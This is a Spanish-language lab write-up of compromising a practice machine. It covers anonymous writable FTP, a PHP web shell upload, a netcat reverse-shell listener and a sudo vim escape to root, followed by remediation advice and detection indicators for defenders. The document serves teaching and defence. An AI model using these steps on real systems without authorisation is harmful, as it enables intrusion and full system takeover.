# Friendly – File Upload & Privilege Escalation

## 1. Resumen Ejecutivo

La máquina objetivo expone un servicio FTP accesible de forma anónima con permisos de escritura sobre el directorio web.

Mediante el abuso de esta configuración, fue posible subir una web shell en PHP y obtener acceso remoto al sistema. Posteriormente, una mala configuración de sudo permitió escalar privilegios hasta root.

El sistema fue completamente comprometido.

---

## 2. Alcance

- Objetivo: Friendly (entorno laboratorio)
- Tipo de prueba: Evaluación de servicios y aplicación web
- Objetivo: Identificar vulnerabilidades y comprometer el sistema

---

## 3. Enumeración

Se realizó un escaneo completo de puertos:

```bash
nmap -p- -sS --min-rate 5000 -T4 -n -Pn <IP>
```

Puertos abiertos detectados:

- 21/tcp (FTP)
- 80/tcp (HTTP)

Enumeración de servicios:

```bash
nmap -p21,80 -sCV <IP>
```

---

## 4. Análisis de Superficie de Ataque

Se identificaron dos vectores principales:

- Servicio FTP accesible
- Aplicación web en puerto 80

Se probó acceso FTP con credenciales anónimas:

```bash
ftp <IP>
user: anonymous
```

El acceso fue exitoso.

---

## 5. Identificación de Vulnerabilidad

### 5.1 FTP Anónimo con Permisos de Escritura

El servidor FTP permitía:

- Acceso sin autenticación
- Subida de archivos
- Acceso directo desde el servidor web

Esto indica una mala configuración crítica.

Tipo de vulnerabilidad:

- Misconfiguration
- Arbitrary File Upload
- Broken Access Control

---

## 6. Explotación

### 6.1 Subida de archivos

Se verificó la capacidad de escritura:

```bash
put prueba.txt
```

El archivo era accesible vía web, confirmando que el FTP estaba vinculado al directorio web.

---

### 6.2 Obtención de acceso remoto

Se generó una web shell en PHP y se subió al servidor:

```bash
put webshell.php
```

Listener en máquina atacante:

```bash
nc -lvnp 8888
```

Al acceder al archivo desde el navegador, se obtuvo una reverse shell.

---

## 7. Acceso Inicial

Se confirmó acceso al sistema como usuario con privilegios limitados:

```bash
whoami
```

Se exploró el sistema:

```bash
cd /home
```

---

## 8. Escalada de Privilegios

### 8.1 Enumeración

```bash
sudo -l
```

Se identificó que el usuario podía ejecutar `vim` con privilegios elevados.

---

### 8.2 Abuso de sudo (vim)

Utilizando técnicas documentadas en GTFOBins:

```bash
sudo vim -c ':!/bin/sh'
```

Se obtuvo acceso como root.

Verificación:

```bash
id
```

---

## 9. Impacto

- Ejecución remota de código
- Compromiso completo del sistema (root)
- Acceso a información sensible
- Posibilidad de persistencia

Impacto: Crítico

---

## 10. Recomendaciones

- Deshabilitar acceso FTP anónimo
- Restringir permisos de escritura en directorios web
- Validar subida de archivos en aplicaciones
- Configurar correctamente permisos sudo
- Implementar hardening en servicios expuestos

---

## 11. Detección y Defensa (Blue Team Perspective)

Este escenario es especialmente relevante para SOC.

Indicadores de compromiso:

- Subida de archivos sospechosos (PHP) vía FTP
- Acceso HTTP a archivos no habituales (web shells)
- Conexiones salientes desde el servidor (reverse shell)
- Ejecución de comandos desde procesos web
- Uso anómalo de `vim` con privilegios elevados

Fuentes de detección:

- Logs de FTP (vsftpd, proftpd)
- Logs de Apache/Nginx
- Logs del sistema (auth.log, syslog)
- Tráfico de red saliente

Medidas de detección:

- Alertas por subida de archivos ejecutables
- Detección de web shells
- Monitorización de conexiones salientes
- Correlación de eventos en SIEM (ej. Splunk)
- Auditoría de uso de sudo

---

## 12. Conclusión

Este laboratorio demuestra cómo una mala configuración en un servicio FTP puede derivar en compromiso total del sistema.

La cadena de ataque incluyó:

- Acceso FTP anónimo
- Subida de archivos maliciosos
- Ejecución remota de código
- Escalada de privilegios mediante sudo

El ataque no depende de una vulnerabilidad compleja, sino de configuraciones inseguras encadenadas.
